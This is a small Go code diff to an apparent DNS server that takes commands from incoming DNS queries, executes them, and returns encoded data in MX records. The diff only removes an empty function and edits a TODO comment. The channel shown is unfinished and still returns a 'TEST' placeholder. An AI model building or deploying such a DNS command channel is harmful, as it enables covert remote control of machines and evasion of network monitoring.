@@ -48,10 +48,6 @@ func (s DNSServer) createServer() *dns.Server {
 	return server
 }
 
-func (s DNSServer) handleQuestion(question dns.Question) {
-
-}
-
 func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	msg := new(dns.Msg)
 	msg.SetReply(r)
@@ -62,7 +58,7 @@ func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 		fmt.Printf("Received command: %s\n", command)
 		output := getCommandOutput(executeCommand(command))
 		fmt.Printf("Result: %s", output)
-		//todo send output instead of test
+		//todo send output instead of test: use msg splitter here
 		encoded := h.server.encoder.Encode("TEST")
 		rr, _ := dns.NewRR(encoded + " 3600 IN MX 10 example.com")
 		msg.Answer = append(msg.Answer, rr)
